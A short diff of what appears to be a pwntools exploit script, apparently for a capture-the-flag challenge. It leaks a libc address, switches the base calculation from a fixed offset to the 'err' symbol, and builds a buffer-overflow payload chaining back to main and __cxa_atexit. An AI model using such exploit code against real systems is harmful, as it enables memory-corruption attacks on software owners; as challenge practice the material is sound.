@@ -113,7 +113,7 @@ io.send(payload)
 
 io.recvuntil(b": ")
 leak = u64(io.recv(6).ljust(8, b'\0'))
-libc.address = leak - 0x1211d0
+libc.address = leak - libc.sym["err"]
 log.info(f"libc @ {hex(libc.address)}")
 
 payload = b'\n' + b'A'*31 + flat(1, exe.sym["main"], libc.sym["__cxa_atexit"])
